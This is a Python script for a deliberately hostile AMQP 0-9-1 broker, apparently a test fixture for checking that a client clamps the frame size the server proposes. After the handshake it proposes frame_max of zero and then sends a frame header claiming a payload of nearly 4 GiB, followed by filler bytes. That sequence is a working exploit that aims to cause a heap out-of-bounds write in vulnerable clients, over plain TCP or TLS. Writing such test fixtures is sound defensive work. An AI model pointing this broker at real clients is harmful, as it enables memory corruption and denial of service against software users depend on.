"""
A minimal, deliberately hostile AMQP 0-9-1 broker.

It walks a connecting client through the handshake up to `Connection.Tune`, proposes a
maximum frame size of zero, and then sends a frame header that declares a payload of
almost 4 GiB followed by a stream of filler bytes.

A client that takes the proposed maximum frame size at face value ends up reading that
stream into its fixed-size receive buffer, which is a heap out-of-bounds write.

Given a certificate and key it speaks amqps instead, so the same attack can be driven through
the client's TLS receive path (which used to be entirely unbounded).
"""

import socket
import struct
import sys
import threading

FRAME_METHOD = 1
FRAME_END = 0xCE

CLASS_CONNECTION = 10
METHOD_START = 10
METHOD_TUNE = 30
METHOD_TUNE_OK = 31

# Almost 4 GiB - the point is that it can not possibly fit in the client's receive buffer.
HUGE_PAYLOAD_SIZE = 0xFFFFFF00

# How much filler to push at the client after the oversized frame header.
FILLER_TOTAL = 8 * 1024 * 1024
FILLER_CHUNK = b"A" * 65536


def frame(frame_type, channel, payload):
    return (
        struct.pack(">BHI", frame_type, channel, len(payload))
        + payload
        + bytes([FRAME_END])
    )


def long_string(value):
    return struct.pack(">I", len(value)) + value


def connection_start():
    payload = struct.pack(">HHBB", CLASS_CONNECTION, METHOD_START, 0, 9)
    payload += struct.pack(">I", 0)  # empty server-properties field table
    payload += long_string(b"PLAIN")
    payload += long_string(b"en_US")
    return frame(FRAME_METHOD, 0, payload)


def connection_tune(frame_max):
    payload = struct.pack(
        ">HHHIH", CLASS_CONNECTION, METHOD_TUNE, 2047, frame_max, 0
    )
    return frame(FRAME_METHOD, 0, payload)


def recv_exactly(conn, size):
    data = b""
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def read_frame(conn):
    """Read one whole AMQP frame: 7-byte header, payload, and the frame-end octet.

    recv is not frame-aware - on TCP/TLS it may return any positive prefix - so both the header
    and the payload have to be read with recv_exactly, otherwise the next read starts in the
    middle of this frame and the stream desyncs. Returns (frame_type, channel, payload) without
    the end octet, or None if the peer went away.
    """
    header = recv_exactly(conn, 7)
    if header is None:
        return None
    frame_type, channel, size = struct.unpack(">BHI", header)
    body = recv_exactly(conn, size + 1)  # payload plus the frame-end octet
    if body is None:
        return None
    return frame_type, channel, body[:size]


def handle(conn, frame_max):
    try:
        conn.settimeout(30)

        # The client opens with the 8-byte protocol header.
        if recv_exactly(conn, 8) is None:
            return

        conn.sendall(connection_start())

        # Connection.StartOk - consume the whole frame so the next read stays frame-aligned.
        if read_frame(conn) is None:
            return

        conn.sendall(connection_tune(frame_max))

        # Connection.TuneOk (possibly pipelined with Connection.Open, so read exactly one frame).
        # Log the frame_max the client settled on: the test asserts it to prove the client clamps
        # hostile proposals to [4096, 128 MiB] instead of echoing them back.
        tune_ok = read_frame(conn)
        if tune_ok is None:
            return
        frame_type, _channel, payload = tune_ok
        if frame_type == FRAME_METHOD and len(payload) >= 10:
            klass, method, _channel_max, client_frame_max = struct.unpack(
                ">HHHI", payload[:10]
            )
            if klass == CLASS_CONNECTION and method == METHOD_TUNE_OK:
                print(f"client TuneOk frame_max={client_frame_max}", flush=True)

        # A frame header claiming a payload that is orders of magnitude larger than the
        # client's receive buffer, immediately followed by data to fill it with.
        conn.sendall(struct.pack(">BHI", FRAME_METHOD, 0, HUGE_PAYLOAD_SIZE))

        sent = 0
        while sent < FILLER_TOTAL:
            conn.sendall(FILLER_CHUNK)
            sent += len(FILLER_CHUNK)
    except OSError:
        pass
    finally:
        conn.close()


def main():
    port = int(sys.argv[1])
    frame_max = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    # Optional TLS: pass a cert and key to make the broker speak amqps, so the same attack can
    # be driven through the client's TLS receive path.
    certfile = sys.argv[3] if len(sys.argv) > 3 else None
    keyfile = sys.argv[4] if len(sys.argv) > 4 else None

    tls_context = None
    if certfile:
        import ssl

        tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        tls_context.load_cert_chain(certfile, keyfile)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(16)
    print(
        f"listening on {port} ({'amqps' if tls_context else 'amqp'}),"
        f" proposing frame_max={frame_max}",
        flush=True,
    )

    while True:
        conn, _ = server.accept()
        if tls_context is not None:
            try:
                conn = tls_context.wrap_socket(conn, server_side=True)
            except OSError:
                # e.g. a plain-TCP liveness probe that never completes the TLS handshake
                conn.close()
                continue
        threading.Thread(target=handle, args=(conn, frame_max), daemon=True).start()


if __name__ == "__main__":
    main()
